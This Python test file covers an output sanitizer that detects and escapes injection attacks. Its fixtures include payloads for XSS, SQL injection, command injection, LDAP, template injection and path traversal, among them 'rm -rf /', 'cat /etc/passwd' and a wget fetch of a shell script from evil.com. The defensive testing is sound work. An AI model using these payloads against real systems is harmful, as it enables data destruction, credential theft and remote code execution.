"""Tests for gavel.output_sanitizer — OWASP ASI04 output injection prevention."""

from __future__ import annotations

from gavel.output_sanitizer import (
    InjectionVector,
    OutputSanitizer,
    SanitizationFinding,
    SanitizationResult,
    _MAX_SCAN_SIZE,
)


class TestXSSDetection:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_script_tag(self):
        r = self.s.scan("<script>alert('xss')</script>")
        assert not r.clean
        assert any(f.vector == InjectionVector.XSS for f in r.findings)
        assert any(f.pattern_matched == "script_tag" for f in r.findings)

    def test_javascript_uri(self):
        r = self.s.scan('href="javascript:void(0)"')
        assert not r.clean
        assert any(f.pattern_matched == "javascript_uri" for f in r.findings)

    def test_event_handler(self):
        r = self.s.scan('<div onmouseover="steal()">hover</div>')
        assert not r.clean
        assert any(f.pattern_matched == "event_handler_attr" for f in r.findings)

    def test_img_onerror(self):
        r = self.s.scan('<img src=x onerror="alert(1)">')
        assert not r.clean
        assert any(f.pattern_matched == "img_onerror" for f in r.findings)

    def test_iframe(self):
        r = self.s.scan('<iframe src="https://evil.com"></iframe>')
        assert not r.clean
        assert any(f.pattern_matched == "iframe_tag" for f in r.findings)

    def test_svg_onload(self):
        r = self.s.scan('<svg onload="alert(1)">')
        assert not r.clean
        assert any(f.pattern_matched == "svg_onload" for f in r.findings)


class TestSQLInjection:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_or_1_eq_1(self):
        r = self.s.scan("admin' OR 1=1 --")
        assert not r.clean
        assert any(f.vector == InjectionVector.SQL_INJECTION for f in r.findings)

    def test_union_select(self):
        r = self.s.scan("1 UNION SELECT username, password FROM users")
        assert not r.clean
        assert any(f.pattern_matched == "union_select" for f in r.findings)

    def test_drop_table(self):
        r = self.s.scan("Robert'); DROP TABLE students;--")
        assert not r.clean
        assert any(f.pattern_matched == "drop_table" for f in r.findings)

    def test_xp_cmdshell(self):
        r = self.s.scan("EXEC xp_cmdshell 'dir'")
        assert not r.clean
        assert any(f.pattern_matched == "xp_cmdshell" for f in r.findings)


class TestCommandInjection:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_semicolon_rm(self):
        r = self.s.scan("file.txt; rm -rf /")
        assert not r.clean
        assert any(f.vector == InjectionVector.COMMAND_INJECTION for f in r.findings)

    def test_pipe_cat(self):
        r = self.s.scan("data | cat /etc/passwd")
        assert not r.clean
        assert any(f.pattern_matched == "pipe_cat" for f in r.findings)

    def test_dollar_paren(self):
        r = self.s.scan("echo $(whoami)")
        assert not r.clean
        assert any(f.pattern_matched == "dollar_paren_exec" for f in r.findings)

    def test_backtick_exec(self):
        r = self.s.scan("value is `id`")
        assert not r.clean
        assert any(f.pattern_matched == "backtick_exec" for f in r.findings)

    def test_wget(self):
        r = self.s.scan("ok && wget http://evil.com/shell.sh")
        assert not r.clean
        assert any(f.pattern_matched == "and_wget" for f in r.findings)


class TestLDAPInjection:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_close_open_paren(self):
        r = self.s.scan("user)(cn=*)")
        assert not r.clean
        assert any(f.vector == InjectionVector.LDAP_INJECTION for f in r.findings)

    def test_wildcard_inject(self):
        r = self.s.scan("*)(objectClass=*)")
        assert not r.clean
        assert any(f.pattern_matched == "ldap_wildcard_close_open" for f in r.findings)

    def test_null_byte(self):
        r = self.s.scan("admin\x00)")
        assert not r.clean
        assert any(f.pattern_matched == "null_byte" for f in r.findings)


class TestTemplateInjection:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_jinja_double_brace(self):
        r = self.s.scan("Hello {{config.items()}}")
        assert not r.clean
        assert any(f.vector == InjectionVector.TEMPLATE_INJECTION for f in r.findings)

    def test_jinja_block(self):
        r = self.s.scan("{% for x in range(10) %}boom{% endfor %}")
        assert not r.clean
        assert any(f.pattern_matched == "jinja_block" for f in r.findings)

    def test_erb_expression(self):
        r = self.s.scan("<%= system('id') %>")
        assert not r.clean
        assert any(f.pattern_matched == "erb_expression" for f in r.findings)

    def test_class_access(self):
        r = self.s.scan("{{''.__class__.__mro__}}")
        assert not r.clean
        assert any(f.pattern_matched == "jinja_class_access" for f in r.findings)


class TestPathTraversal:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_dot_dot_slash(self):
        r = self.s.scan("load file: ../../../etc/passwd")
        assert not r.clean
        assert any(f.vector == InjectionVector.PATH_TRAVERSAL for f in r.findings)

    def test_dot_dot_backslash(self):
        r = self.s.scan("open ..\\..\\windows\\system32")
        assert not r.clean
        assert any(f.pattern_matched == "dot_dot_backslash" for f in r.findings)

    def test_encoded_traversal(self):
        r = self.s.scan("GET /%2e%2e/%2e%2e/etc/passwd")
        assert not r.clean
        assert any(f.pattern_matched == "encoded_dot_dot" for f in r.findings)

    def test_etc_passwd(self):
        r = self.s.scan("reading /etc/passwd directly")
        assert not r.clean
        assert any(f.pattern_matched == "etc_passwd" for f in r.findings)


class TestCleanInputs:
    """Ensure normal text does NOT trigger false positives."""

    def setup_method(self):
        self.s = OutputSanitizer()

    def test_normal_text(self):
        r = self.s.scan("The weather today is sunny and 72 degrees.")
        assert r.clean

    def test_code_snippet_with_angle_brackets(self):
        # Generic code discussion should not trigger XSS for plain angle brackets
        r = self.s.scan("Use x > 5 and y < 10 in your condition.")
        assert r.clean

    def test_sql_in_documentation(self):
        # Mentioning SQL keywords in prose without injection syntax
        r = self.s.scan("The SELECT statement retrieves rows from a table.")
        assert r.clean

    def test_normal_path(self):
        r = self.s.scan("The config file is at /home/user/app/config.yaml")
        assert r.clean

    def test_json_with_braces(self):
        # Plain JSON should not trigger template injection (no double-brace)
        r = self.s.scan('{"name": "Alice", "age": 30}')
        assert r.clean


class TestSanitization:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_xss_neutralized(self):
        r = self.s.sanitize("<script>alert('xss')</script>")
        assert not r.clean
        assert r.sanitized_text is not None
        assert "<script>" not in r.sanitized_text
        assert "&lt;script&gt;" in r.sanitized_text

    def test_clean_text_passthrough(self):
        text = "Normal safe output."
        r = self.s.sanitize(text)
        assert r.clean
        assert r.sanitized_text == text

    def test_backticks_escaped(self):
        r = self.s.sanitize("result is `whoami`")
        assert r.sanitized_text is not None
        assert "`" not in r.sanitized_text
        assert "&#x60;" in r.sanitized_text

    def test_dollar_paren_escaped(self):
        r = self.s.sanitize("value=$(id)")
        assert r.sanitized_text is not None
        assert "$(" not in r.sanitized_text

    def test_angle_brackets_escaped(self):
        r = self.s.sanitize('<iframe src="evil">')
        assert r.sanitized_text is not None
        assert "<iframe" not in r.sanitized_text


class TestMultiFieldScanning:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_multiple_fields(self):
        fields = {
            "title": "Normal title",
            "body": "<script>alert(1)</script>",
            "footer": "safe text",
        }
        r = self.s.scan_fields(fields)
        assert not r.clean
        assert r.finding_count >= 1
        assert any(f.location == "body" for f in r.findings)

    def test_all_clean_fields(self):
        fields = {
            "name": "Alice",
            "message": "Hello world",
        }
        r = self.s.scan_fields(fields)
        assert r.clean

    def test_multiple_dirty_fields(self):
        fields = {
            "query": "' OR 1=1 --",
            "cmd": "data; rm -rf /",
        }
        r = self.s.scan_fields(fields)
        assert not r.clean
        locations = {f.location for f in r.findings}
        assert "query" in locations
        assert "cmd" in locations


class TestSizeLimit:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_oversized_text_skipped(self):
        huge = "A" * (_MAX_SCAN_SIZE + 1)
        r = self.s.scan(huge)
        assert r.clean
        assert r.findings == []

    def test_at_limit_still_scanned(self):
        # Exactly at limit should still scan
        text = "A" * (_MAX_SCAN_SIZE - 30) + "<script>alert(1)</script>"
        r = self.s.scan(text)
        # The text is within limit, so it should be scanned
        assert not r.clean


class TestConfidenceScoring:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_high_confidence_xss(self):
        r = self.s.scan("<script>alert(1)</script>")
        xss = [f for f in r.findings if f.pattern_matched == "script_tag"]
        assert len(xss) >= 1
        assert xss[0].confidence >= 0.9

    def test_moderate_confidence_sql_comment(self):
        r = self.s.scan("some text --")
        sql = [f for f in r.findings if f.pattern_matched == "sql_comment_eol"]
        if sql:
            assert sql[0].confidence <= 0.6

    def test_confidence_range(self):
        r = self.s.scan("admin' OR 1=1 --")
        for f in r.findings:
            assert 0.0 <= f.confidence <= 1.0


class TestEdgeCases:
    def setup_method(self):
        self.s = OutputSanitizer()

    def test_empty_string(self):
        r = self.s.scan("")
        assert r.clean
        assert r.findings == []

    def test_unicode_text(self):
        r = self.s.scan("Bonjour le monde! \u00c7a va bien. \u2603 \u2764")
        assert r.clean

    def test_mixed_vectors(self):
        text = "<script>alert(1)</script> ' OR 1=1 -- ; rm -rf /"
        r = self.s.scan(text)
        assert not r.clean
        vectors = {f.vector for f in r.findings}
        assert InjectionVector.XSS in vectors
        assert InjectionVector.SQL_INJECTION in vectors
        assert InjectionVector.COMMAND_INJECTION in vectors

    def test_snippet_truncation(self):
        long_prefix = "A" * 100
        text = long_prefix + "<script>alert(1)</script>" + "B" * 100
        r = self.s.scan(text)
        xss = [f for f in r.findings if f.pattern_matched == "script_tag"]
        assert len(xss) >= 1
        assert xss[0].snippet.startswith("...")
        assert len(xss[0].snippet) < len(text)

    def test_scanned_at_is_set(self):
        r = self.s.scan("test")
        assert r.scanned_at is not None

    def test_vectors_found_property(self):
        r = self.s.scan("<script>alert(1)</script> ' OR 1=1")
        assert InjectionVector.XSS in r.vectors_found
        assert InjectionVector.SQL_INJECTION in r.vectors_found

    def test_none_sanitized_on_scan_only(self):
        r = self.s.scan("<script>alert(1)</script>")
        assert r.sanitized_text is None

    def test_sanitize_returns_sanitized_text(self):
        r = self.s.sanitize("<script>alert(1)</script>")
        assert r.sanitized_text is not None
